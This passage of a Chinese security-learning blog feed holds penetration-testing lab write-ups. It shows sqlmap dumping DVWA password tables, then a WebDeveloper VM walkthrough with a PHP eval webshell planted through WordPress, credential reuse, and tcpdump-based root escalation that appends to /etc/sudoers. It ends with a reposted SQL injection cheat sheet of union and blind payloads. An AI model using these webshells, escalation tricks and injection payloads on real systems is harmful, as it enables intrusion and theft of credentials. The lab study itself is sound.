href="http://192.168.17.130/dvwa/vulnerabilities/sqli/?id=11&amp;Submit=Submit#&quot;">http://192.168.17.130/dvwa/vulnerabilities/sqli/?id=11&amp;Submit=Submit#&quot;</a> –cookie&#x3D;’security&#x3D;low;PHPSESSID&#x3D;f383161ec8314206ec01076f9b34b866’ -D dvwa -T users –columns</p><p>sqlmap -u “<a href="http://192.168.17.130/dvwa/vulnerabilities/sqli/?id=11&amp;Submit=Submit#&quot;">http://192.168.17.130/dvwa/vulnerabilities/sqli/?id=11&amp;Submit=Submit#&quot;</a> –cookie&#x3D;’security&#x3D;low;PHPSESSID&#x3D;f383161ec8314206ec01076f9b34b866’ -D dvwa -T guestbook –columns</p></blockquote><p>Sqlmap 输出截图：</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201117040003.png" alt="users"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201117040102.png" alt="guestbook"></p><ol start="7"><li>枚举指定数据表中的所有用户名和密码，并 down 到本地</li></ol><p><code>-C 指定数据表中的列</code>：枚举数据表中的列</p><p><code>--dump</code>：存储数据表项</p><p>你输入的命令：</p><blockquote><p>sqlmap -u “<a href="http://192.168.17.130/dvwa/vulnerabilities/sqli/?id=11&amp;Submit=Submit#&quot;">http://192.168.17.130/dvwa/vulnerabilities/sqli/?id=11&amp;Submit=Submit#&quot;</a> –cookie&#x3D;’security&#x3D;low;PHPSESSID&#x3D;f383161ec8314206ec01076f9b34b866’ -D dvwa -T users -C user password –dump</p></blockquote><p>Sqlmap 输出截图：</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201117040932.png"></p><p>查看 down 到本地的用户名和密码，截图。</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201117041143.png"></p><h1 id="网络渗透测试实验四：WebDeveloper靶机rootshell"><a href="#网络渗透测试实验四：WebDeveloper靶机rootshell" class="headerlink" title="网络渗透测试实验四：WebDeveloper靶机rootshell"></a>网络渗透测试实验四：WebDeveloper靶机rootshell</h1><p>首先自然是下载好靶机，放 VMware 里，在此感谢大佬同学提供的校内网盘，下载速度很快，孩子很喜欢</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201202224343.png" alt="webdeveloper"></p><p>本次实验的网络环境是把主攻手：kali 和受害主机：WebDeveloper 放在了同一个网段，都用 <code>NAT</code> 模式接入网络</p><p>靶机开好了自然是不能动了，接下来开 <code>nmap</code> 扫一扫，先扫存活主机，简单排除一下，确定<code>192.168.17.134</code>为靶机 IP 地址</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201202225036.png"></p><p>接着扫开放端口，发现开放了两个端口，分别是<code>80</code>（猜测是web网站服务）和<code>22</code>的 ssh 端口</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201202225245.png"></p><p>访问一下<code>192.168.17.134</code>，发现是个 <code>wordpress</code>搭的站，老熟人了</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201202225629.png" alt="WordPress"></p><p>然后进行常规的信息收集，不急，先扫目录，直接开 kali 里的 <code>dirb</code> 来扫，payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.17.134/ -o result.txt</span><br></pre></td></tr></table></figure><p><code>-o result.txt</code> 是将结果生成一个 <code>result.txt</code> 保存在家目录<code>~</code>里，<code>result.txt</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">OUTPUT_FILE: result.txt</span><br><span class="line">START_TIME: Wed Dec  2 10:16:40 2020</span><br><span class="line">URL_BASE: http://192.168.17.134/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">GENERATED WORDS: 4612</span><br><span class="line">---- Scanning URL: http://192.168.17.134/ ----</span><br><span class="line">+ http://192.168.17.134/index.php (CODE:301|SIZE:0)</span><br><span class="line">==&gt; DIRECTORY: http://192.168.17.134/ipdata/</span><br><span class="line">+ http://192.168.17.134/server-status (CODE:403|SIZE:302)</span><br><span class="line">==&gt; DIRECTORY: http://192.168.17.134/wp-admin/</span><br><span class="line">==&gt; DIRECTORY: http://192.168.17.134/wp-content/</span><br><span class="line">==&gt; DIRECTORY: http://192.168.17.134/wp-includes/</span><br><span class="line">+ http://192.168.17.134/xmlrpc.php (CODE:405|SIZE:42)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.17.134/ipdata/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.</span><br><span class="line">    (Use mode &#x27;-w&#x27; if you want to scan it anyway)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.17.134/wp-admin/ ----</span><br><span class="line">+ http://192.168.17.134/wp-admin/admin.php (CODE:302|SIZE:0)</span><br><span class="line">==&gt; DIRECTORY: http://192.168.17.134/wp-admin/css/</span><br><span class="line">==&gt; DIRECTORY: http://192.168.17.134/wp-admin/images/</span><br><span class="line">==&gt; DIRECTORY: http://192.168.17.134/wp-admin/includes/</span><br><span class="line">+ http://192.168.17.134/wp-admin/index.php (CODE:302|SIZE:0)</span><br><span class="line">==&gt; DIRECTORY: http://192.168.17.134/wp-admin/js/</span><br><span class="line">==&gt; DIRECTORY: http://192.168.17.134/wp-admin/maint/</span><br><span class="line">==&gt; DIRECTORY: http://192.168.17.134/wp-admin/network/</span><br><span class="line">==&gt; DIRECTORY: http://192.168.17.134/wp-admin/user/</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.17.134/wp-content/ ----</span><br><span class="line">+ http://192.168.17.134/wp-content/index.php (CODE:200|SIZE:0)</span><br><span class="line">==&gt; DIRECTORY: http://192.168.17.134/wp-content/languages/</span><br><span class="line">==&gt; DIRECTORY: http://192.168.17.134/wp-content/plugins/</span><br><span class="line">==&gt; DIRECTORY: http://192.168.17.134/wp-content/themes/</span><br><span class="line">==&gt; DIRECTORY: http://192.168.17.134/wp-content/upgrade/</span><br><span class="line">==&gt; DIRECTORY: http://192.168.17.134/wp-content/uploads/</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.17.134/wp-includes/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.</span><br><span class="line">    (Use mode &#x27;-w&#x27; if you want to scan it anyway)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.17.134/wp-admin/css/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.</span><br><span class="line">    (Use mode &#x27;-w&#x27; if you want to scan it anyway)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.17.134/wp-admin/images/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.</span><br><span class="line">    (Use mode &#x27;-w&#x27; if you want to scan it anyway)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.17.134/wp-admin/includes/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.</span><br><span class="line">    (Use mode &#x27;-w&#x27; if you want to scan it anyway)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.17.134/wp-admin/js/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.</span><br><span class="line">    (Use mode &#x27;-w&#x27; if you want to scan it anyway)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.17.134/wp-admin/maint/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.</span><br><span class="line">    (Use mode &#x27;-w&#x27; if you want to scan it anyway)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.17.134/wp-admin/network/ ----</span><br><span class="line">+ http://192.168.17.134/wp-admin/network/admin.php (CODE:302|SIZE:0)</span><br><span class="line">+ http://192.168.17.134/wp-admin/network/index.php (CODE:302|SIZE:0)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.17.134/wp-admin/user/ ----</span><br><span class="line">+ http://192.168.17.134/wp-admin/user/admin.php (CODE:302|SIZE:0)</span><br><span class="line">+ http://192.168.17.134/wp-admin/user/index.php (CODE:302|SIZE:0)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.17.134/wp-content/languages/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.</span><br><span class="line">    (Use mode &#x27;-w&#x27; if you want to scan it anyway)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.17.134/wp-content/plugins/ ----</span><br><span class="line">+ http://192.168.17.134/wp-content/plugins/index.php (CODE:200|SIZE:0)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.17.134/wp-content/themes/ ----</span><br><span class="line">+ http://192.168.17.134/wp-content/themes/index.php (CODE:200|SIZE:0)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.17.134/wp-content/upgrade/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.</span><br><span class="line">    (Use mode &#x27;-w&#x27; if you want to scan it anyway)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.17.134/wp-content/uploads/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.</span><br><span class="line">    (Use mode &#x27;-w&#x27; if you want to scan it anyway)</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Wed Dec  2 10:17:25 2020</span><br><span class="line">DOWNLOADED: 32284 - FOUND: 12</span><br></pre></td></tr></table></figure><p>里面泄露了很多敏感的目录，比如后台登录路径<code>wp-admin</code>，文件上传路径<code>wp-content/uploads/</code>但是最奇怪的是这一个<code>http://192.168.17.134/ipdata/</code>，进来下载了一个文件<code>analyze.cap</code></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201202232211.png"></p><p>用<code>winhex</code>打开发现一段 <code>http请求头</code> ，感觉是个流量文件，再用<code>wireshark</code>打开</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201202232727.png" alt="winhex"></p><p>分析流量，直接看<code>http</code>的流量包，发现有对<code>wp-login.php</code>页面以<code>POST</code>模式发出请求的流量包，查看包的表单信息发现能登录成功的账号密码</p><p>账号：<code>webdeveloper</code></p><p>密码：<code>Te5eQg&amp;4sBS!Yr$)wf%(DcAd</code></p><blockquote><ol><li>登录页面的账号密码一般是将账号密码存入表单采用 <code>POST</code> 模式提交请求，所以重点找 <code>POST</code> 的包</li><li>分析流量发现在发送登录请求过后，返回的状态码是<code>200 OK</code>，由此判断这个账号密码是正确的账号密码</li></ol></blockquote><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201202233557.png"></p><p>然后访问后台登录的 url ，登录进入后台</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201202233726.png" alt="后台"></p><p>进入后台自然是寻找文件上传的接口，然后传🐎 getshell ，发现有很多处能够攻击的点</p><ul><li>直接上传插件，直接传 php 的🐎，路径<code>/wp-content/uploads/year/month/xx.php</code>，比如<code>/wp-content/uploads/2020/12/horse.php</code></li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201202234216.png"></p><ul><li>编辑已安装插件的 php 文件，在里面添加一句话木马，再启用插件也可以达到攻击目的</li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201203005031.png"></p><ul><li>编辑主题里的模板页面（也是 php 页面），在里面添加一句话木马，比如在<code>404.php</code>页面文件中添加木马，访问到 404 页面就能达到攻击目的</li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201203005546.png"></p><ul><li>媒体库里也有文件上传的接口，但是不能直接上传 php 文件，可能需要配合上传<code>.user.ini</code>或者<code>.htaccess</code>文件和图片🐎来绕过安全检测来达到攻击目的</li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201203010346.png"></p><blockquote><p>下面是用第一种方法打的</p></blockquote><p><code>horse.php</code>是一句话木马，内容为<code>&lt;?php @eval($_POST[&#39;ma&#39;]);phpinfo(); ?&gt;</code></p><blockquote><p><code>phpinfo()</code>函数执行成功会返回当前 php 环境的很多信息，用来判断木马是否被解析成 php 文件执行</p></blockquote><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201202234216.png"></p><p>然后会显示无法安装包，但是我们的🐎还是上传上去了的</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201202234304.png"></p><p>访问我们的🐎，<code>http://192.168.17.134/wp-content/uploads/2020/12/horse.php</code>，出现<code>phpinfo</code>，ok</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201202234432.png"></p><p>拿<code>蚁剑</code>连，想直接拿到 flag ，但是权限太低了</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201203010648.png"></p><p>但是可以看看敏感文件，<code>config</code>一般是配置文件，所以看看<code>wp-config.php</code>，发现了<code>MySQL</code>数据库的账号密码</p><p>账号：<code>webdeveloper</code></p><p>密码：<code>MasterOfTheUniverse</code></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201203011027.png"></p><p>到这有点没思路了，想到靶机开放了<code>22</code>端口，可能账号密码跟这个会是一样的，开 xshell 尝试连接，结果成功了，<code>sudo -l</code>查看可以用的 root 命令有一个<code>tcpdump</code></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201203011405.png"></p><p>但是尝试拿 flag 还是不够资格，需要继续提权，到这里已经不会了，去看了百度，说要用<code>tcpdump</code>提权</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201203011606.png"></p><p>创建攻击脚本，名字叫<code>exploit</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch /tmp/exploit</span><br></pre></td></tr></table></figure><p>写入 <code>shellcode</code>（要执行的代码）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">&#x27;cat /root/flag.txt&#x27;</span> &gt; <span class="regexp">/tmp/</span>exploit</span><br></pre></td></tr></table></figure><p>赋予可执行权限</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /tmp/exploit</span><br><span class="line"><span class="comment">// +x 参数表示给 exploit 文件赋予可执行权限</span></span><br></pre></td></tr></table></figure><p><a href="https://www.runoob.com/linux/linux-comm-chmod.html">Linux chmod命令详解</a></p><p>利用<code>tcpdump</code>执行任意命令</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump -i eth0 -w /dev/<span class="literal">null</span> -W <span class="number">1</span> -G <span class="number">1</span> -z /tmp/exploit -Z root</span><br></pre></td></tr></table></figure><blockquote><p>用到的<code>tcpdump</code>命令：<br> <code>-i eth0</code> 从指定网卡捕获数据包<br> <code>-w /dev/null</code> 将捕获到的数据包输出到空设备（不输出数据包结果）<br> <code>-z [command]</code> 运行指定的命令<br> <code>-Z [user]</code> 指定用户执行命令<br> <code>-G [rotate_seconds]</code> 每rotate_seconds秒一次的频率执行<code>-w</code>指定的转储<br> <code>-W [num]</code> 指定抓包数量</p><blockquote><p><code>tcpdump</code>提权的原理就是利用<code>-z</code>和<code>-Z</code>，<code>-z</code>执行脚本，<code>-Z</code>指定以 <code>root</code> 用户执行脚本，从而提权</p><p>&#96;&#96;-W<code>1</code>-G<code>1，表示一次抓一个包，然后把这个包丢到黑洞里面，黑洞是</code>dev&#x2F;null&#96;</p><blockquote><p><code>tcpdump</code>是什么</p><p>用简单的话来定义，就是：dump the traffic on a  network，根据使用者的定义对网络上的数据包进行截获的包分析工具。 可以将网络中传送的数据包的“头”完全截获下来提供分析。它支持针对网络层、协议、主机、网络或端口的过滤，并提供and、or、not等逻辑语句来帮助你去掉无用的信息。</p></blockquote></blockquote></blockquote><p>拿到 flag</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201203015122.png" alt="flag"></p><p>另一种提权思路，既然可以写 shell 了，可以直接给<code>webdeveloper</code>这个用户提升到<code>root</code>权限，直接写 shell 到<code>sudo</code>的配置文件<code>/etc/sudoers</code>里</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">&#x27;echo &quot;%webdeveloper ALL=(ALL:ALL) ALL&quot; &gt;&gt; /etc/sudoers&#x27;</span> &gt; <span class="regexp">/tmp/</span>exploit</span><br><span class="line">chmod +x /tmp/exploit</span><br><span class="line">sudo tcpdump -i eth0 -w /dev/<span class="literal">null</span> -W <span class="number">1</span> -G <span class="number">1</span> -z /tmp/exploit -Z root</span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201203020216.png" alt="flag too"></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入总结</title>
      <link href="/posts/61314/"/>
      <url>/posts/61314/</url>
      
        <content type="html"><![CDATA[<blockquote><p>写在前面<br>本文转自<a href="https://xz.aliyun.com/t/2869">先知社区-SQL注入总结</a>，文章分享来自社团学长</p></blockquote><h1 id="0x01-什么是SQL注入"><a href="#0x01-什么是SQL注入" class="headerlink" title="0x01 什么是SQL注入"></a>0x01 什么是SQL注入</h1><p>sql 注入就是一种通过操作输入来修改后台操作语句达到执行恶意 sql 语句来进行攻击的技术。</p><h1 id="0x02-SQL注入的分类"><a href="#0x02-SQL注入的分类" class="headerlink" title="0x02 SQL注入的分类"></a>0x02 SQL注入的分类</h1><h2 id="按变量类型分"><a href="#按变量类型分" class="headerlink" title="按变量类型分"></a>按变量类型分</h2><ul><li>数字型</li><li>字符型</li></ul><h2 id="按HTTP提交方式分"><a href="#按HTTP提交方式分" class="headerlink" title="按HTTP提交方式分"></a>按HTTP提交方式分</h2><ul><li>GET 注入</li><li>POST 注入</li><li>Cookie 注入</li></ul><h2 id="按注入方式分"><a href="#按注入方式分" class="headerlink" title="按注入方式分"></a>按注入方式分</h2><ul><li>报错注入</li><li>盲注<ul><li>布尔盲注</li><li>时间盲注</li></ul></li><li>union 注入</li></ul><h2 id="编码问题"><a href="#编码问题" class="headerlink" title="编码问题"></a>编码问题</h2><ul><li>宽字节注入</li></ul><h1 id="0x03识别后台数据库"><a href="#0x03识别后台数据库" class="headerlink" title="0x03识别后台数据库"></a>0x03识别后台数据库</h1><h2 id="根据操作系统平台"><a href="#根据操作系统平台" class="headerlink" title="根据操作系统平台"></a>根据操作系统平台</h2><p><strong>sql server</strong>：Windows（IIS)</p><p><strong>MySQL</strong>：Apache</p><h2 id="根据web语言"><a href="#根据web语言" class="headerlink" title="根据web语言"></a>根据web语言</h2><p><strong>Microsoft SQL Server</strong>：ASP 和 .Net</p><p><strong>MySQL</strong>：PHP</p><p><strong>Oracle&#x2F;MySQL</strong>：java</p><p>(以下是对 mysql 数据库的总结，其他类型数据库会不定时更新)</p><h1 id="0x04-MySQL-5-0以上和MySQL-5-0以下版本的区别"><a href="#0x04-MySQL-5-0以上和MySQL-5-0以下版本的区别" class="headerlink" title="0x04 MySQL 5.0以上和MySQL 5.0以下版本的区别"></a>0x04 MySQL 5.0以上和MySQL 5.0以下版本的区别</h1><p>MySQL 5.0以上版本存在一个存储着数据库信息的信息数据库–<strong>INFORMATION_SCHEMA</strong> ，其中保存着关于 MySQL 服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。 而5.0以下没有。</p><p><strong><code>information_schema</code></strong></p><p>系统数据库，记录当前数据库的数据库，表，列，用户权限等信息</p><p><strong><code>SCHEMATA</code></strong></p><p>储存 mysql 所有数据库的基本信息，包括数据库名，编码类型路径等</p><p><strong><code>TABLES</code></strong></p><p>储存 mysql 中的表信息，包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等</p><p><strong><code>COLUMNS</code></strong></p><p>储存 mysql 中表的列信息，包括这个表的所有列以及每个列的信息，该列是表中的第几列，列的数据类型，列的编码类型，列的权限，列的注释等</p><h1 id="0x05-基本手工注入流程"><a href="#0x05-基本手工注入流程" class="headerlink" title="0x05 基本手工注入流程"></a>0x05 基本手工注入流程</h1><p>要从 select 语句中获得有用的信息，必须确定该数据库中的字段数和那个字段能够输出，这是前提。</p><h2 id="1-MySQL-gt-x3D-5-0"><a href="#1-MySQL-gt-x3D-5-0" class="headerlink" title="1. MySQL &gt;&#x3D; 5.0"></a>1. MySQL &gt;&#x3D; 5.0</h2><h2 id="（1）获取字段数"><a href="#（1）获取字段数" class="headerlink" title="（1）获取字段数"></a>（1）获取字段数</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> n  <span class="comment">/*通过不断尝试改变n的值来观察页面反应确定字段数*/</span></span><br></pre></td></tr></table></figure><h2 id="（2）获取系统数据库名"><a href="#（2）获取系统数据库名" class="headerlink" title="（2）获取系统数据库名"></a>（2）获取系统数据库名</h2><p>在MySQL &gt;5.0中，数据库名存放在<code>information_schema</code>数据库下<code>schemata</code>表<code>schema_name</code>字段中</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,schema_name <span class="keyword">from</span> information_schema.schemata</span><br></pre></td></tr></table></figure><h2 id="（3）获取当前数据库名"><a href="#（3）获取当前数据库名" class="headerlink" title="（3）获取当前数据库名"></a>（3）获取当前数据库名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,...,database()</span><br></pre></td></tr></table></figure><h2 id="（4）获取数据库中的表"><a href="#（4）获取数据库中的表" class="headerlink" title="（4）获取数据库中的表"></a>（4）获取数据库中的表</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,...,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,...,table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="（5）获取表中的字段"><a href="#（5）获取表中的字段" class="headerlink" title="（5）获取表中的字段"></a>（5）获取表中的字段</h2><p>这里假设已经获取到表名为 user </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,...,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="（6）获取各个字段值"><a href="#（6）获取各个字段值" class="headerlink" title="（6）获取各个字段值"></a>（6）获取各个字段值</h2><p>这里假设已经获取到表名为 user，且字段为 username 和 password </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">null</span>,group_concat(username,password) <span class="keyword">from</span> users</span><br></pre></td></tr></table></figure><h2 id="2-MySQL-lt-5-0"><a href="#2-MySQL-lt-5-0" class="headerlink" title="2.MySQL &lt; 5.0"></a>2.MySQL &lt; 5.0</h2><p>MySQL &lt; 5.0 没有信息数据库**<code>information_schema</code>**，所以只能手工枚举爆破（二分法思想）。</p><p>该方式通常用于盲注。</p><h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><p><strong>length(str)</strong> ：返回字符串 str 的长度</p><p><strong>substr(str, pos, len)</strong> ：将 str 从 pos 位置开始截取 len 长度的字符进行返回。注意这里的 pos 位置是从 1 开始的，不是数组的 0 开始</p><p><strong>mid(str,pos,len)</strong> ：跟上面的一样，截取字符串</p><p><strong>ascii(str)</strong> ：返回字符串 str 的最左面字符的 ASCII 代码值</p><p><strong>ord(str)</strong> ：将字符或布尔类型转成 ascll 码</p><p><strong>if(a,b,c)</strong> ：a 为条件，a 为 true，返回 b，否则返回 c，如 if(1&gt;2,1,0) ,返回 0</p><h2 id="（1）基于布尔的盲注"><a href="#（1）基于布尔的盲注" class="headerlink" title="（1）基于布尔的盲注"></a>（1）基于布尔的盲注</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> database()),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">64</span> <span class="comment">/*判断数据库名的第一个字符的ascii值是否大于64*/</span></span><br></pre></td></tr></table></figure><h2 id="（2）基于时间的盲注"><a href="#（2）基于时间的盲注" class="headerlink" title="（2）基于时间的盲注"></a>（2）基于时间的盲注</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> if(<span class="built_in">SUBSTRING</span>(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">4</span>)<span class="operator">=</span><span class="string">&#x27;root&#x27;</span>,sleep(<span class="number">4</span>),<span class="number">1</span>),<span class="keyword">null</span>,<span class="keyword">null</span> <span class="comment">/*提取用户名前四个字符做判断，正确就延迟4秒，错误返回1*/</span></span><br></pre></td></tr></table></figure><h1 id="0x06-常用注入方式"><a href="#0x06-常用注入方式" class="headerlink" title="0x06 常用注入方式"></a>0x06 常用注入方式</h1><p>注释符：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line"><span class="comment">-- (有空格)或--+</span></span><br><span class="line"><span class="comment">/**/</span></span><br></pre></td></tr></table></figure><p>内联注释：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*！...*/</span></span><br></pre></td></tr></table></figure><h2 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h2><figure class="highlight sql"><table><tr><td 